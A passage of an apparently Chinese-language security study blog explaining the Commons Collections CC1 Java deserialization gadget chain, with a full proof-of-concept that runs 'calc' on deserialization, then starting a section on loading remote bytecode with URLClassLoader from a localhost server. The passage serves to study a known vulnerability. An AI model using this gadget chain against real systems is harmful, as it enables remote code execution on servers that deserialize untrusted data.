punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token string\">\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" /></p>\n<p>其实和 demo 最大的区别就是将 Runtime.getRuntime () 换成了 Runtime.class ，前者是一个 java.lang.Runtime 对象，后者是一个 java.lang.Class 对象。Class 类有实现 Serializable 接口，所 以可以被序列化。</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/e726f61ca4784cb68a36cc0c8ea617ad.png\" alt=\"img\" /><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" />编辑能出来序列化数据，但是没有出现计算器点开</p>\n<pre><code>AnnotationInvocationHandler这个类：\nprivate void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123;\n        var1.defaultReadObject();\n        AnnotationType var2 = null;\n\n        try &#123;\n            var2 = AnnotationType.getInstance(this.type);\n        &#125; catch (IllegalArgumentException var9) &#123;\n            throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);\n        &#125;\n\n        Map var3 = var2.memberTypes();\n        Iterator var4 = this.memberValues.entrySet().iterator();\n\n        while(var4.hasNext()) &#123;\n            Map.Entry var5 = (Map.Entry)var4.next();\n            String var6 = (String)var5.getKey();\n            Class var7 = (Class)var3.get(var6);\n            if (var7 != null) &#123;\n                Object var8 = var5.getValue();\n                if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123;\n                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6)));\n                &#125;\n            &#125;\n        &#125;\n\n    &#125;\n&#125;\n</code></pre>\n<p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" /></p>\n<p>发现有个比较不等于 null 时赋值 outmap，等于 outmap.put 函数，所以怎么绕过呢</p>\n<blockquote>\n<p>\\1. sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是</p>\n<p>Annotation 的子类，且其中必须含有至少一个方法，假设方法名是 X</p>\n<p>\\2. 被 TransformedMap.decorate 修饰的 Map 中必须有一个键名为 X 的元素</p>\n</blockquote>\n<p>所以，这也解释了为什么我前面用到 Retention.class ，因为 Retention 有一个方法，名为 value；所</p>\n<p>以，为了再满足第二个条件，我需要给 Map 中放入一个 Key 是 value 的元素：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>innerMap<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"value\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"xxxx\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" /></p>\n<p>​                                                                                                                                                                                                                                        <img data-src=\"https://i-blog.csdnimg.cn/direct/e338adf848a44275911353e061e7063c.png\" alt=\"img\" /><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" />编辑                                                                              复现成功</p>\n<p>复现失败的原因就是在 java8u71 版本之后不再直接 使用反序列化得到的 Map 对象，而是新建了一个 LinkedHashMap 对象，并将原来的键值添加进去。 所以，后续对 Map 的操作都是基于这个新的 LinkedHashMap 对象，而原来我们精心构造的 Map 不再执行 set 或 put 操作，也就不会触发 RCE 了。</p>\n<p>完整代码如下：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">myapp1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Transformer</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span>functors<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ChainedTransformer</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span>functors<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ConstantTransformer</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span>functors<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">InvokerTransformer</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span>map<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">TransformedMap</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ByteArrayInputStream</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ByteArrayOutputStream</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ObjectInputStream</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ObjectOutputStream</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Retention</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Constructor</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">HashMap</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Map</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> okok <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> transformers <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getMethod\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                        <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                        <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token string\">\"getRuntime\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                        <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"invoke\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                        <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                        <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exec\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                        <span class=\"token keyword\">new</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                                <span class=\"token string\">\"calc\"</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token class-name\">Transformer</span> transformerChain <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">(</span>transformers<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token class-name\">Map</span> innerMap <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        innerMap<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"value\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"xxxx\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token class-name\">Map</span> outerMap <span class=\"token operator\">=</span> <span class=\"token class-name\">TransformedMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">decorate</span><span class=\"token punctuation\">(</span>innerMap<span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>                transformerChain<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token class-name\">Class</span> clazz<span class=\"token operator\">=</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sun.reflect.annotation.AnnotationInvocationHandler\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token class-name\">Constructor</span> constructor <span class=\"token operator\">=</span> clazz<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredConstructor</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Map</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        constructor<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token class-name\">Object</span> obj <span class=\"token operator\">=</span> constructor<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Retention</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> outerMap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token class-name\">ByteArrayOutputStream</span> barr <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ByteArrayOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token class-name\">ObjectOutputStream</span> oos <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectOutputStream</span><span class=\"token punctuation\">(</span>barr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        oos<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        oos<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>barr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token class-name\">ObjectInputStream</span> ois <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectInputStream</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>                <span class=\"token class-name\">ByteArrayInputStream</span><span class=\"token punctuation\">(</span>barr<span class=\"token punctuation\">.</span><span class=\"token function\">toByteArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token class-name\">Object</span> o <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">)</span>ois<span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" /></p>\n<h1 id=\"动态加载字节码的哪些方法\"><a class=\"anchor\" href=\"#动态加载字节码的哪些方法\">#</a> 动态加载字节码的哪些方法</h1>\n<h2 id=\"字节码是什么\"><a class=\"anchor\" href=\"#字节码是什么\">#</a> 字节码是什么</h2>\n<p>java 字节码其实仅仅值得是 java 虚拟机执行使用的一类指令，通常被存储在.class 文件中</p>\n<p>在不同平台不同 cpu 的计算机指令有差异，但因为 java 是一门跨平台的编译型语言，所以这些差异对于上层开发者来说是透明的，上层开发者只需要将自己的代码编译一次，即可运行在不同平台的 JVM 虚拟机中。</p>\n<p>甚至，开发者可以用类似 Scala,Kotlinc 这样的语言编写代码，只要你的编译器能够将代码编译成.class 文件，都可以在 JVM 虚拟机中运行：</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202504101908998.png\" alt=\"image-20250410190839771\" /></p>\n<p>但是，这里所说的字节码，可以理解的更广义一些 --<strong> 所有能够恢复成一个类并在 JVM 虚拟机里加载的字节序列，都在我们的探讨范围内</strong>。</p>\n<h3 id=\"利用urlclassloader加载远程class文件\"><a class=\"anchor\" href=\"#利用urlclassloader加载远程class文件\">#</a> 利用 URLClassLoader 加载远程 class 文件</h3>\n<p>java 的 ClassLoader 来用来加载字节码文件最基础的方法。：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">ClassLoader</span>是什么呢？他就是一个“加载器”，告诉java虚拟机如何加载这个类。</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>java默认的<span class=\"token class-name\">ClassLoader</span>就是根据类名来加载类，这个类名是类完整路径，如<span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span></span>Runtime</span>。</pre></td></tr></table></figure><p>ClassLoader 的概念的确不是一语概之的，这里说的是 ClassLoader：<strong>URLClassLoader。</strong></p>\n<p>URLClassLoder 实际上是我们平时默认使用的 AppClassLoader 的符类，所以，</p>\n<p>我们<strong>解释 URLClassLoader 的工作过程实际上就是在解释默认的 Java 类加载器的工作流程。</strong></p>\n<p>正常情况下，java 会根据配置向 sun.boot.class.path 和 java.class.path 中列举到的基础路径（这些路径是经过处理后的 java.net.URL 类）来寻找.class 文件来加载，而这个<strong>基础路径又分为三种情况</strong>：</p>\n<pre><code>1.URL未以斜杠/结尾，则认为是一个JAR文件，使用JarLoader来寻找类，即为在Jar包中寻找.class文件\n2.URL以斜杠/结尾，且协议名是file，则使用FileLoader来寻找类，即为在本地文件系统中寻找.class文件\n3.URL以斜杠/结尾，且协议名不是file，则使用最基础的Loader来寻找类\n</code></pre>\n<p>正常开发的时候通常遇到的是前两者，那什么时候才会出现使用 Loader 寻找类的情况呢？当然是非 file 协议的情况下，最常见的就是 http 协议。</p>\n<pre><code>这里设计到一个问题：“java的url究竟支持那些协议”\nJava 默认支持以下几种 URL 协议：\nhttp\nhttps\nftp\nfile\njar\n 非标准协议（不原生支持，但可扩展）：\nJava 提供了机制允许你注册自定义协议处理器，比如：\nmailto\ndata\ngopher\njdbc（用于数据库连接，但不是通过 java.net.URL 处理的）\n如果你想支持这些协议，需要：\n自定义协议处理类，继承 URLStreamHandler\n设置系统属性 java.protocol.handler.pkgs 来注册协议包\n例如：\n-Djava.protocol.handler.pkgs=com.mycompany.protocols\n然后你就可以访问如 myproto://some/resource，前提是你实现了 com.mycompany.protocols.myproto.Handler 类。\n</code></pre>\n<p>我们可以使用 HTTP 协议来测试一下</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202504101924419.png\" alt=\"image-20250410192411309\" /></p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202504101924751.png\" alt=\"image-20250410192431646\" /></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">zijiema</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">InvocationTargetException</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Method</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>net<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">MalformedURLException</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>net<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">URL</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>net<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">URLClassLoader</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">// 加载远程类还是只能是 java8 之前的版本，java8 之后就不行了</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">ClassLoader</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ClassNotFoundException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">InstantiationException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IllegalAccessException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">MalformedURLException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">InvocationTargetException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">NoSuchMethodException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token constant\">URL</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> urls<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">URL</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"http://127.0.0.1:8000/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token class-name\">URLClassLoader</span> loader <span class=\"token operator\">=</span> <span class=\"token class-name\">URLClassLoader</span><span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span>urls<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Loading class from: http://localhost:8000/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> clazz <span class=\"token operator\">=</span> loader<span class=\"token punctuation\">.</span><span class=\"token function\">loadClass</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"zijiema.helloworld\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Class loaded: \"</span> <span class=\"token operator\">+</span> clazz<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">// 使用反射创建实例并执行某些方法</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token class-name\">Object</span> obj <span class=\"token operator\">=</span> clazz<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span 